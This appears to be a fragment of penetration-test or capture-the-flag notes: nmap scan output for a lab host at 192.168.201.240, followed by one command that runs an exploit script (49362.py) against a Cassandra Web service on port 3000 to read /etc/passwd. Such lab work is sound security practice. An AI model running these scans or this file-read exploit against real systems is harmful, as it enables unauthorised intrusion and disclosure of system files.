**sudo nmap \-sS \-sV \-\-script=default 192\.168\.201\.240**
PORT     STATE  SERVICE          VERSION
22/tcp   open   ssh              OpenSSH 7\.9p1 Debian 10\+deb10u2 \(protocol 2\.0\)
| ssh\-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c \(RSA\)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e \(ECDSA\)
|\_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 \(ED25519\)
80/tcp   open   http             Apache httpd 2\.4\.38
|\_http\-server\-header: Apache/2\.4\.38 \(Debian\)
|\_http\-title: 403 Forbidden
139/tcp  closed netbios\-ssn
445/tcp  closed microsoft\-ds
3000/tcp open   http             Thin httpd
|\_http\-server\-header: thin
|\_http\-title: Cassandra Web
8021/tcp open   freeswitch\-event FreeSWITCH mod\_event\_socket
Service Info: Host: 127\.0\.0\.1; OS: Linux; CPE: cpe:/o:linux:linux\_kernel
**
nmap \-sV \-p\- 192\.168\.201\.240 \-v**
PORT     STATE  SERVICE          VERSION
22/tcp   open   ssh              OpenSSH 7\.9p1 Debian 10\+deb10u2 \(protocol 2\.0\)
80/tcp   open   http             Apache httpd 2\.4\.38
139/tcp  closed netbios\-ssn
445/tcp  closed microsoft\-ds
3000/tcp open   http             Thin httpd
8021/tcp open   freeswitch\-event FreeSWITCH mod\_event\_socket

python 49362\.py 192\.168\.246\.240 /etc/passwd \-p 3000

